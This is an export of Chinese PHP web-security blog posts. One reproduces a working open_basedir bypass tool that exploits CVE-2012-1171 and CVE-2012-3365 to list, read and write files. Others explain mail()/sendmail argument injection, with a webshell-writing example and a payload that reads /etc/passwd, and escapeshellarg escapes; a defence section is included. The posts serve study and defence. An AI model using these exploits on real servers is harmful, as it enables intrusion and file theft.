$to) &#123; // some compatibility fixes for Windows paths $from = rtrim($from, '\\/') . '/'; $from = str_replace('\\\\', '/', $from); $to = str_replace('\\\\', '/', $to); $from = explode('/', $from); $to = explode('/', $to); $relPath = $to; foreach($from as $depth =&gt; $dir) &#123; // find first non-matching dir if($dir === $to[$depth]) &#123; // ignore this directory array_shift($relPath); &#125; else &#123; // get number of remaining dirs to $from $remaining = count($from) - $depth; if($remaining &gt; 1) &#123; // add traversals up to first matching dir $padLength = (count($relPath) + $remaining - 1) * -1; $relPath = array_pad($relPath, $padLength, '..'); break; &#125; else &#123; $relPath[0] = './' . $relPath[0]; &#125; &#125; &#125; return implode('/', $relPath);&#125;function delfile($deldir)&#123; if (@is_file($deldir)) &#123; @chmod($deldir,0777); return @unlink($deldir); &#125;else if(@is_dir($deldir))&#123; if(($mydir = @opendir($deldir)) == NULL) return false; while(false !== ($file = @readdir($mydir))) &#123; $name = File_Str($deldir.'/'.$file); if(($file!='.') &amp;&amp; ($file!='..'))&#123;delfile($name);&#125; &#125; @closedir($mydir); @chmod($deldir,0777); return @rmdir($deldir) ? true : false; &#125;&#125;function File_Str($string)&#123; return str_replace('//','/',str_replace('\\\\','/',$string));&#125;function getRandStr($length = 6) &#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $randStr = ''; for ($i = 0; $i &lt; $length; $i++) &#123; $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $randStr;&#125; 网上的一个脚本原理是用glob://伪协议： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384&lt;?php/*PHP open_basedir bypass collectionWorks with &gt;= PHP5By /fd, @filedescriptor(https://twitter.com/filedescriptor) */ // Assistant functionsfunction getRelativePath($from, $to) &#123; // some compatibility fixes for Windows paths $from = rtrim($from, '\\/') . '/'; $from = str_replace('\\\\', '/', $from); $to = str_replace('\\\\', '/', $to); $from = explode('/', $from); $to = explode('/', $to); $relPath = $to; foreach ($from as $depth =&gt; $dir) &#123; // find first non-matching dir if ($dir === $to[$depth]) &#123; // ignore this directory array_shift($relPath); &#125; else &#123; // get number of remaining dirs to $from $remaining = count($from) - $depth; if ($remaining &gt; 1) &#123; // add traversals up to first matching dir $padLength = (count($relPath) + $remaining - 1) * -1; $relPath = array_pad($relPath, $padLength, '..'); break; &#125; else &#123; $relPath[0] = './' . $relPath[0]; &#125; &#125; &#125; return implode('/', $relPath);&#125; function fallback($classes) &#123; foreach ($classes as $class) &#123; $object = new $class; if ($object-&gt;isAvailable()) &#123; return $object; &#125; &#125; return new NoExploit;&#125; // Core classesinterface Exploitable &#123; function isAvailable(); function getDescription();&#125; class NoExploit implements Exploitable &#123; function isAvailable() &#123; return true; &#125; function getDescription() &#123; return 'No exploit is available.'; &#125;&#125; abstract class DirectoryLister implements Exploitable &#123; var $currentPath; function isAvailable() &#123;&#125; function getDescription() &#123;&#125; function getFileList() &#123;&#125; function setCurrentPath($currentPath) &#123; $this-&gt;currentPath = $currentPath; &#125; function getCurrentPath() &#123; return $this-&gt;currentPath; &#125;&#125; class GlobWrapperDirectoryLister extends DirectoryLister &#123; function isAvailable() &#123; return stripos(PHP_OS, 'win') === FALSE &amp;&amp; in_array('glob', stream_get_wrappers()); &#125; function getDescription() &#123; return 'Directory listing via glob pattern'; &#125; function getFileList() &#123; $file_list = array(); // normal files $it = new DirectoryIterator(\"glob://&#123;$this-&gt;getCurrentPath()&#125;*\"); foreach ($it as $f) &#123; $file_list[] = $f-&gt;__toString(); &#125; // special files (starting with a dot(.)) $it = new DirectoryIterator(\"glob://&#123;$this-&gt;getCurrentPath()&#125;.*\"); foreach ($it as $f) &#123; $file_list[] = $f-&gt;__toString(); &#125; sort($file_list); return $file_list; &#125;&#125; class RealpathBruteForceDirectoryLister extends DirectoryLister &#123; var $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_' , $extension = array() , $charactersLength = 38 , $maxlength = 3 , $fileList = array(); function isAvailable() &#123; return ini_get('open_basedir') &amp;&amp; function_exists('realpath'); &#125; function getDescription() &#123; return 'Directory listing via brute force searching with realpath function.'; &#125; function setCharacters($characters) &#123; $this-&gt;characters = $characters; $this-&gt;charactersLength = count($characters); &#125; function setExtension($extension) &#123; $this-&gt;extension = $extension; &#125; function setMaxlength($maxlength) &#123; $this-&gt;maxlength = $maxlength; &#125; function getFileList() &#123; set_time_limit(0); set_error_handler(array(__CLASS__, 'handler')); $number_set = array(); while (count($number_set = $this-&gt;nextCombination($number_set, 0)) &lt;= $this-&gt;maxlength) &#123; $this-&gt;searchFile($number_set); &#125; sort($this-&gt;fileList); return $this-&gt;fileList; &#125; function nextCombination($number_set, $length) &#123; if (!isset($number_set[$length])) &#123; $number_set[$length] = 0; return $number_set; &#125; if ($number_set[$length] + 1 === $this-&gt;charactersLength) &#123; $number_set[$length] = 0; $number_set = $this-&gt;nextCombination($number_set, $length + 1); &#125; else &#123; $number_set[$length]++; &#125; return $number_set; &#125; function searchFile($number_set) &#123; $file_name = 'a'; foreach ($number_set as $key =&gt; $value) &#123; $file_name[$key] = $this-&gt;characters[$value]; &#125; // normal files realpath($this-&gt;getCurrentPath() . $file_name); // files with preceeding dot realpath($this-&gt;getCurrentPath() . '.' . $file_name); // files with extension foreach ($this-&gt;extension as $extension) &#123; realpath($this-&gt;getCurrentPath() . $file_name . $extension); &#125; &#125; function handler($errno, $errstr, $errfile, $errline) &#123; $regexp = '/File\\((.*)\\) is not within/'; preg_match($regexp, $errstr, $matches); if (isset($matches[1])) &#123; $this-&gt;fileList[] = $matches[1]; &#125; &#125;&#125; abstract class FileWriter implements Exploitable &#123; var $filePath; function isAvailable() &#123;&#125; function getDescription() &#123;&#125; function write($content) &#123;&#125; function setFilePath($filePath) &#123; $this-&gt;filePath = $filePath; &#125; function getFilePath() &#123; return $this-&gt;filePath; &#125;&#125; abstract class FileReader implements Exploitable &#123; var $filePath; function isAvailable() &#123;&#125; function getDescription() &#123;&#125; function read() &#123;&#125; function setFilePath($filePath) &#123; $this-&gt;filePath = $filePath; &#125; function getFilePath() &#123; return $this-&gt;filePath; &#125;&#125; // Assistant class for DOMFileWriter &amp; DOMFileReaderclass StreamExploiter &#123; var $mode, $filePath, $fileContent; function stream_close() &#123; $doc = new DOMDocument; $doc-&gt;strictErrorChecking = false; switch ($this-&gt;mode) &#123; case 'w': $doc-&gt;loadHTML($this-&gt;fileContent); $doc-&gt;removeChild($doc-&gt;firstChild); $doc-&gt;saveHTMLFile($this-&gt;filePath); break; default: case 'r': $doc-&gt;resolveExternals = true; $doc-&gt;substituteEntities = true; $doc-&gt;loadXML(\"&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \\\"file://&#123;$this-&gt;filePath&#125;\\\"&gt;]&gt;&lt;doc&gt;&amp;file;&lt;/doc&gt;\", LIBXML_PARSEHUGE); echo $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue; &#125; &#125; function stream_open($path, $mode, $options, &amp;$opened_path) &#123; $this-&gt;filePath = substr($path, 10); $this-&gt;mode = $mode; return true; &#125; public function stream_write($data) &#123; $this-&gt;fileContent = $data; return strlen($data); &#125;&#125; class DOMFileWriter extends FileWriter &#123; function isAvailable() &#123; return extension_loaded('dom') &amp;&amp; (version_compare(phpversion(), '5.3.10', '&lt;=') || version_compare(phpversion(), '5.4.0', '=')); &#125; function getDescription() &#123; return 'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.'; &#125; function write($content) &#123; // set it to global resource in order to trigger RSHUTDOWN global $_DOM_exploit_resource; stream_wrapper_register('exploit', 'StreamExploiter'); $_DOM_exploit_resource = fopen(\"exploit://&#123;$this-&gt;getFilePath()&#125;\", 'w'); fwrite($_DOM_exploit_resource, $content); &#125;&#125; class DOMFileReader extends FileReader &#123; function isAvailable() &#123; return extension_loaded('dom') &amp;&amp; (version_compare(phpversion(), '5.3.10', '&lt;=') || version_compare(phpversion(), '5.4.0', '=')); &#125; function getDescription() &#123; return 'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.'; &#125; function read() &#123; // set it to global resource in order to trigger RSHUTDOWN global $_DOM_exploit_resource; stream_wrapper_register('exploit', 'StreamExploiter'); $_DOM_exploit_resource = fopen(\"exploit://&#123;$this-&gt;getFilePath()&#125;\", 'r'); &#125;&#125; class SqliteFileWriter extends FileWriter &#123; function isAvailable() &#123; return is_writable(getcwd()) &amp;&amp; (extension_loaded('sqlite3') || extension_loaded('sqlite')) &amp;&amp; (version_compare(phpversion(), '5.3.15', '&lt;=') || (version_compare(phpversion(), '5.4.5', '&lt;=') &amp;&amp; PHP_MINOR_VERSION == 4)); &#125; function getDescription() &#123; return 'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted'; &#125; function write($content) &#123; $sqlite_class = extension_loaded('sqlite3') ? 'sqlite3' : 'SQLiteDatabase'; mkdir(':memory:'); $payload_path = getRelativePath(getcwd() . '/:memory:', $this-&gt;getFilePath()); $payload = str_replace('\\'', '\\'\\'', $content); $database = new $sqlite_class(\":memory:/&#123;$payload_path&#125;\"); $database-&gt;exec(\"CREATE TABLE foo (bar STRING)\"); $database-&gt;exec(\"INSERT INTO foo (bar) VALUES ('&#123;$payload&#125;')\"); $database-&gt;close(); rmdir(':memory:'); &#125;&#125; // End of Core?&gt;&lt;?php$action = isset($_GET['action']) ? $_GET['action'] : '';$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : getcwd();$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;$directorLister = fallback(array('GlobWrapperDirectoryLister', 'RealpathBruteForceDirectoryLister'));$fileWriter = fallback(array('DOMFileWriter', 'SqliteFileWriter'));$fileReader = fallback(array('DOMFileReader'));$append = '';?&gt;&lt;style&gt;#panel &#123; height: 200px; overflow: hidden;&#125;#panel &gt; pre &#123; margin: 0; height: 200px;&#125;&lt;/style&gt;&lt;div id=\"panel\"&gt;&lt;pre id=\"dl\"&gt;open_basedir: &lt;span style=\"color: red\"&gt;&lt;?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?&gt;&lt;/span&gt;&lt;form style=\"display:inline-block\" action=\"\"&gt;&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;/legend&gt;Current Directory: &lt;input name=\"cwd\" size=\"100\" value=\"&lt;?php echo $cwd; ?&gt;\"&gt;&lt;input type=\"submit\" value=\"Go\"&gt;&lt;?php if (get_class($directorLister) === 'RealpathBruteForceDirectoryLister'): ?&gt;&lt;?php$characters = isset($_GET['characters']) ? $_GET['characters'] : $directorLister-&gt;characters;$maxlength = isset($_GET['maxlength']) ? $_GET['maxlength'] : $directorLister-&gt;maxlength;$append = \"&amp;characters=&#123;$characters&#125;&amp;maxlength=&#123;$maxlength&#125;\"; $directorLister-&gt;setMaxlength($maxlength);?&gt;Search Characters: &lt;input name=\"characters\" size=\"100\" value=\"&lt;?php echo $characters; ?&gt;\"&gt;Maxlength of File: &lt;input name=\"maxlength\" size=\"1\" value=\"&lt;?php echo $maxlength; ?&gt;\"&gt;&lt;?php endif;?&gt;Description : &lt;strong&gt;&lt;?php echo $directorLister-&gt;getDescription(); ?&gt;&lt;/strong&gt;&lt;/fieldset&gt;&lt;/form&gt;&lt;/pre&gt;&lt;?php$file_path = isset($_GET['file_path']) ? $_GET['file_path'] : '';?&gt;&lt;pre id=\"rf\"&gt;open_basedir: &lt;span style=\"color: red\"&gt;&lt;?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?&gt;&lt;/span&gt;&lt;form style=\"display:inline-block\" action=\"\"&gt;&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;/legend&gt;File Path: &lt;input name=\"file_path\" size=\"100\" value=\"&lt;?php echo $file_path; ?&gt;\"&gt;&lt;input type=\"submit\" value=\"Read\"&gt;Description: &lt;strong&gt;&lt;?php echo $fileReader-&gt;getDescription(); ?&gt;&lt;/strong&gt;&lt;input type=\"hidden\" name=\"action\" value=\"rf\"&gt;&lt;/fieldset&gt;&lt;/form&gt;&lt;/pre&gt;&lt;pre id=\"wf\"&gt;open_basedir: &lt;span style=\"color: red\"&gt;&lt;?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?&gt;&lt;/span&gt;&lt;form style=\"display:inline-block\" action=\"\"&gt;&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;/legend&gt;File Path : &lt;input name=\"file_path\" size=\"100\" value=\"&lt;?php echo $file_path; ?&gt;\"&gt;&lt;input type=\"submit\" value=\"Write\"&gt;File Content: &lt;textarea cols=\"70\" name=\"content\"&gt;&lt;/textarea&gt;Description : &lt;strong&gt;&lt;?php echo $fileWriter-&gt;getDescription(); ?&gt;&lt;/strong&gt;&lt;input type=\"hidden\" name=\"action\" value=\"wf\"&gt;&lt;/fieldset&gt;&lt;/form&gt;&lt;/pre&gt;&lt;/div&gt;&lt;a href=\"#dl\"&gt;Directory Listing&lt;/a&gt; | &lt;a href=\"#rf\"&gt;Read File&lt;/a&gt; | &lt;a href=\"#wf\"&gt;Write File&lt;/a&gt;&lt;hr&gt;&lt;pre&gt;&lt;?php if ($action === 'rf'): ?&gt;&lt;plaintext&gt;&lt;?php$fileReader-&gt;setFilePath($file_path);echo $fileReader-&gt;read();?&gt;&lt;?php elseif ($action === 'wf'): ?&gt;&lt;?phpif (isset($_GET['content'])) &#123; $fileWriter-&gt;setFilePath($file_path); $fileWriter-&gt;write($_GET['content']); echo 'The file should be written.';&#125; else &#123; echo 'Something goes wrong.';&#125;?&gt;&lt;?php else: ?&gt;&lt;ol&gt;&lt;?php$directorLister-&gt;setCurrentPath($cwd);$file_list = $directorLister-&gt;getFileList();$parent_path = dirname($cwd); echo \"&lt;li&gt;&lt;a href='?cwd=&#123;$parent_path&#125;&#123;$append&#125;#dl'&gt;Parent&lt;/a&gt;&lt;/li&gt;\";if (count($file_list) &gt; 0) &#123; foreach ($file_list as $file) &#123; echo \"&lt;li&gt;&lt;a href='?cwd=&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl'&gt;&#123;$file&#125;&lt;/a&gt;&lt;/li&gt;\"; &#125;&#125; else &#123; echo 'No files found. The path is probably not a directory.';&#125;?&gt;&lt;/ol&gt;&lt;?php endif;?&gt; 试了下，简单的界面化了，但局限性非常明显，就是glob://伪协议的局限性： 0x0A 参考PHP绕过open_basedir列目录的研究 通过chdir来bypass open_basedir 从PHP底层看open_basedir bypass php5全版本绕过open_basedir读文件脚本 绕过open_basedir读文件脚本","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"PHP中mail()函数安全问题与防御","date":"2019-07-16T14:23:52.000Z","path":"2019/07/16/PHP中mail-函数安全问题与防御/","text":"0x01 函数简介(PHP 4, PHP 5, PHP 7) mail()函数允许您从脚本中直接发送电子邮件。如果邮件的投递被成功地接收，则返回 true，否则返回 false。 函数定义如下： 1mail ( string $to , string $subject , string $message [, mixed $additional_headers [, string $additional_parameters ]] ) : bool 参数说明： 参数 描述 to 必需。规定邮件的接收者。 subject 必需。规定邮件的主题。该参数不能包含任何换行字符。 message 必需。规定要发送的消息。 additional_headers 可选。规定额外的报头，比如 From, Cc 以及 Bcc。 additional_parameters 可选。规定 sendmail 程序的额外参数。 在Linux系统上，mail()函数是默认调用sendmail程序发送邮件的。而这里我们看到，通过mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。 发送一封简单的邮件的Demo代码： 12345678910&lt;?php$txt = \"First line of text\\nSecond line of text\";// 如果一行大于 70 个字符，请使用 wordwrap()。$txt = wordwrap($txt,70);// 发送邮件mail(\"somebody@example.com\",\"My subject\",$txt);?&gt; 0x02 安全问题在PHP中，mail()函数无论是自身问题或者助攻其他漏洞方面都是出现很多它的身影的。 我们从参数开始说起，其实可以明显看到mail()函数的前三个必须的参数是不存在类似其他参数所存在的注入风险的，安全问题主要集中在后面两个参数。 垃圾邮件发送可控点：第一个参数to 要说在mail()函数的三个必须的参数中是否有安全风险，那就是第一个参数即to。 当to参数可由用户从外部输入来控制时，攻击者就可以利用to参数来设定受害者的邮箱来不断地发送垃圾邮件。对服务端本身危害不大，但值得注意。 邮件头注入可控点：第四个参数additional_headers 前提条件：PHP 5.4.42 和 5.5.27 之前 我们知道additional_headers参数是用于添加额外的报头，由于邮件标题由CRLF换行符\\r\\n来分隔的，因此当未初始化第四个参数时，攻击者可以使用这些字符来附加其他电子邮件标题。此攻击称为电子邮件头注入（或短电子邮件注入）。通过向注入CC:或BCC:标头添加多个电子邮件地址来发送多个垃圾邮件可能会被滥用。 具体email头注入的示例可参考：PHP Email Injection Example [Updated 2018] 参数注入可控点：第五个参数additional_parameters 我们知道，mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。 sendmail是Linux中发送邮件的程序。在其额外参数中，支持主要选项有以下三种： -O option = valueQueueDirectory = queuedir 选择队列消息 -X logfile这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。 -f from email这个参数可以让我们指定我们发送邮件的邮箱地址。 -C file 这个参数用File变量指定的备用配置文件启动sendmail命令。 利用1——向Web目录写日志shell主要原理就是利用mail()第五个参数additional_parameters向sendmail程序发送额外参数-O QueueDirectory=queuedir和-X logfile，其中logfile即详细日志文件设置为Web目录中的PHP文件，而邮件中有部分内容设置为恶意PHP代码，当访问该文件时就会在Web目录生成PHP日志文件、其中详细记录包含了恶意PHP代码，再访问该PHP日志文件即可触发恶意代码执行： 12345678&lt;?php$to = \"mi1k@7ea.com\";$subject = \"hhhhhh\";$message = \"&lt;?php phpinfo();?&gt;\";$headers = \"CC: alan@7ea.com\";$options = \"-O QueueDirectory=/tmp -X /var/www/html/log-shell.php\";mail($to, $subject, $message, $headers, $options);?&gt; 访问该文件后，过段时间（等sendmail程序反应）查看在当前Web目录生成了log-shell.php文件，其中包含我们输入的php代码： 直接访问log-shell.php即可触发代码执行： 利用2——读取任意文件内容看个参数注入原意为向指定输入邮箱发送mail.txt文件内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题： 123&lt;?system(\"/usr/sbin/sendmail -t -i -f\".escapeshellcmd($_GET[c]).' &lt; mail.txt');?&gt; 利用-C参数选项读取任意文件内容，输入payload`a@b.com -C/etc/passwd -X/tmp/output.txt`： escapeshellarg()逃逸对于第五个参数addiional_parameters外部可控即存在参数注入的问题，有小伙伴会通过调用escapeshellarg()来对addiional_parameters参数进行过滤，但是由于在mail()函数的源码中是会调用escapeshellcmd()函数来过滤addiional_parameters参数的，从而导致了escapeshellarg&gt;escapeshellcmd参数注入，逃逸了escapeshellarg()的过滤。 具体原理和Demo参考：《浅谈escapeshellarg逃逸与参数注入》 受该漏洞影响的一些扩展应用组件信息如下表： Application Version Reference Roundcube &lt;= 1.2.2 CVE-2016-9920 MediaWiki &lt; 1.29 Discussion PHPMailer &lt;= 5.2.18 CVE-2016-10033 Zend Framework &lt; 2.4.11 CVE-2016-10034 SwiftMailer &lt;= 5.4.5-DEV CVE-2016-10074 SquirrelMail &lt;= 1.4.23 CVE-2017-7692 不安全的FILTER_VALIDATE_EMAIL有些程序员会将第五个参数additional_parameters通过调用FILTER_VALIDATE_EMAIL过滤器来进行email地址的校验，但是仅仅靠FILTER_VALIDATE_EMAIL来实现防御还是存在安全问题的。 下面先看下几个基本概念。 filter_var()函数(PHP 5 &gt;= 5.2.0, PHP 7) filter_var() 函数通过指定的过滤器过滤一个变量。如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。 函数定义如下： 1filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed 参数 描述 variable 必需。规定要过滤的变量。 filter 可选。规定要使用的过滤器的 ID。默认是 FILTER_SANITIZE_STRING。参见 完整的 PHP Filter 参考手册，查看可能的过滤器。过滤器 ID 可以是 ID 名称（比如 FILTER_VALIDATE_EMAIL）或 ID 号（比如 274）。 options 可选。规定一个包含标志/选项的关联数组或者一个单一的标志/选项。检查每个过滤器可能的标志和选项。 可以看到，该函数第二个参数是可以设置指定过滤器的，其中对于email地址的过滤可以设置FILTER_VALIDATE_EMAIL过滤器。 FILTER_VALIDATE_EMAIL过滤器FILTER_VALIDATE_EMAIL过滤器把值作为email地址来验证。 示例Demo： 123456789101112&lt;?php$email = \"someone@exa mple.com\";if(!filter_var($email, FILTER_VALIDATE_EMAIL))&#123; echo \"E-mail is not valid\";&#125;else&#123; echo \"E-mail is valid\";&#125;?&gt; 安全缺陷 关于 filter_var() 中 FILTER_VALIDATE_EMAIL 这个选项作用，我们可以看看这个帖子 PHP FILTER_VALIDATE_EMAIL 。这里面有个结论引起了我的注意： none of the special characters in this local part are allowed outside quotation marks ，表示所有的特殊符号必须放在双引号中。 filter_var() 问题在于，我们能够在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 filter_val() 使其认为我们仍然在双引号中，我们就可以绕过检测。 我们写个简单的例子就知道： 12345&lt;?phpvar_dump(filter_var('\\'is.\"\\'\\ not\\ allowed\"@example.com', FILTER_VALIDATE_EMAIL));var_dump(filter_var('\"is.\\ not\\ allowed\"@example.com', FILTER_VALIDATE_EMAIL));var_dump(filter_var('\"is.\"\"\\ not\\ allowed\"@example.com', FILTER_VALIDATE_EMAIL));?&gt; 可以看到，这样就能逃逸出FILTER_VALIDATE_EMAIL来输入单引号和空格等字符了，进而可以结合其他漏洞打出组合拳进行高阶利用。 助攻disable_functions绕过Bash破壳漏洞具体原理和示例可看：浅谈几种Bypass disable_functions的方法 这里简单说下mail()函数为啥进行了助攻：因为mail()函数的第五个参数additional_parameters在mail.c的源码中会直接拼接成一条新的命令然后传入popen()中执行，当目标系统存在Bash破壳漏洞时，攻击者就可以借助mail()函数来注入第五个参数从而实现disable_functions的绕过。 LD_PRELOAD具体原理和示例可看：浅谈几种Bypass disable_functions的方法 这里简单说下mail()函数为啥进行了助攻：我们知道这种方法绕过disable_functions主要是通过劫持某个函数如getuid()或劫持启动进程来实现的，而调用mail()函数会启动进程或调用系统sendmail程序，进而调用getuid()函数从而实现劫持，最终导致disable_functions被绕过。 More当然，以上列的只是常见的遇到，外国佬研究的比较深，有多个新的攻击利用向量可以借鉴，具体的看文章就好： 原文：Pwning PHP mail() function For Fun And RCE 翻译版：详细解析PHP mail()函数漏洞利用技巧 0x03 防御方法对于直接的mail()函数的问题，主要针对几个参数进行防御： to参数：除非特定场景，一般不让用户从外部输入； subject参数：安全使用； message参数：安全使用； headers参数：若用户可从外部输入，则过滤\\r和\\n字符，防御CRLF注入； parameters参数：尽量不使用用户输入，实在不行要按照业务场景进行严格过滤； 对于由mail()间接助攻引起的一系列问题，需按业务场景来规划： 如果非必需，直接disable_functions禁用掉； 如果业务需要，不用或严格过滤第五个参数，起到点缓解的作用； 0x04 参考Why mail() is dangerous in PHP","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"浅谈escapeshellarg逃逸与参数注入","date":"2019-07-04T14:54:41.000Z","path":"2019/07/04/浅谈escapeshellarg与参数注入/","text":"0x01 基本概念escapeshellarg() (PHP 4 &gt;= 4.0.3, PHP 5, PHP 7) escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数。 函数定义如下： 12&gt; escapeshellarg ( string $arg ) : string&gt; escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。 看个例子就知道了： 123&lt;?phpvar_dump(escapeshellarg($_GET[p]));?&gt; 先输入字符串mi1k7ea，看到escapeshellarg()会给该字符串整个加上单引号括起来，加起来总共9个字符： 输入mi1k’7ea，看到先转义了中间这个单引号，再分别在左右两边加上单引号括起来，加起来总共13个字符： 该函数正确使用的Demo，这样可有效从参数位置防御命令注入漏洞，也是参数注入： 123&lt;?phpsystem('ls '.escapeshellarg($dir));?&gt; escapeshellcmd() (PHP 4, PHP 5, PHP 7) escapeshellcmd — shell 元字符转义。 函数定义如下： 12&gt; escapeshellcmd ( string $command ) : string&gt; escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A 和 \\xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；第二，如果单引号和双引号不是成对出现时，会被转义掉。 看个例子就知道了： 123&lt;?phpvar_dump(escapeshellcmd($_GET[p]));?&gt; 输入mi1k7ea，其中不包含以上特殊字符的字符串，是不会添加单引号括起来的，内容不变： 输入’mi1k’7ea’;字符串，由于前面两个单引号成对了因此没有对其进行转义，而最后的单引号没有成对因此被转义掉，除此之外分号作为特殊字符也被转义处理： 该函数正确使用的Demo，这样能确保用户只执行一个命令： 12345678&lt;?php// 我们故意允许任意数量的参数$command = './configure '.$_POST['configure_options'];$escaped_command = escapeshellcmd($command); system($escaped_command);?&gt; 两者区别前面已经说了，这里再列下比较一下。 PHP对于命令注入漏洞提供了escapeshellarg()和escapeshellcmd()两个函数来进行防御，当然两者针对的场景有区别。 escapeshellarg 主要是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。 处理过程：如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。 场景功能： 1.确保用户只传递一个参数给命令 2.用户不能指定更多的参数一个 3.用户不能执行不同的命令 escapeshellcmd 主要是防止用户利用shell的一些技巧（如分号、管道符、反引号等）来进行命令注入攻击。 处理过程：如果输入内容中&amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A 和 \\xFF等特殊字符会被反斜杠给转义掉；如果单引号和双引号不是成对出现时，会被转义掉。 场景功能： 1.确保用户只执行一个命令 2.用户可以指定不限数量的参数 3.用户不能执行不同的命令 mail()与sendmail后续列出的CVE漏洞涉及到这两个概念，这里提下。 mail() 函数定义如下： 1234567bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]]) 其参数含义分别表示如下： to，指定邮件接收者，即接收人 subject，邮件的标题 message，邮件的正文内容 additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC additional_parameters，指定传递给发送程序sendmail的额外参数。 在Linux系统上，mail()函数是默认调用sendmail程序发送邮件的。而这里我们看到，通过mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。 sendmail sendmail是Linux中发送邮件的程序。在其额外参数中，支持主要选项有以下三种： -O option = valueQueueDirectory = queuedir 选择队列消息 -X logfile这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。 -f from email这个参数可以让我们指定我们发送邮件的邮箱地址。 写shell利用示例 看个示例就知道怎么通过mail()向sendmail添加额外参数来写shell了。 主要原理就是利用mail()第五个参数additional_parameters向sendmail程序发送额外参数-O QueueDirectory=queuedir和-X logfile，其中logfile即详细日志文件设置为Web目录中的PHP文件，而邮件中有部分内容设置为恶意PHP代码，当访问该文件时就会在Web目录生成PHP日志文件、其中详细记录包含了恶意PHP代码，再访问该PHP日志文件即可触发恶意代码执行： 12345678&lt;?php$to = \"mi1k@7ea.com\";$subject = \"hhhhhh\";$message = \"&lt;?php phpinfo();?&gt;\";$headers = \"CC: alan@7ea.com\";$options = \"-O QueueDirectory=/tmp -X /var/www/html/log-shell.php\";mail($to, $subject, $message, $headers, $options);?&gt; 访问该文件后，过段时间（等sendmail程序反应）查看在当前Web目录生成了log-shell.php文件，其中包含我们输入的php代码： 直接访问log-shell.php即可触发代码执行： 0x02 escapeshellarg与escapeshellcmd参数注入为什么会提到参数注入呢？——由前面我们知道，当使用了escapeshellarg和escapeshellcmd时会有效地限制了不能执行第二条命令，但是我们仍然可以将参数传递给第一个命令，也就是说，我们有机会通过参数注入来达到攻击的目的。 何为参数注入 参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。 一般的，命令的格式时这样的：cmd [参数选项1] [参数值1] …，如‘ls -l /tmp’等形式。 当有一条shell命令，前面的命令cmd我们不可控，但是参数选项可控或者后面部分都可控时，则可能会存命令参数注入漏洞。 看个经典案例——gitlist 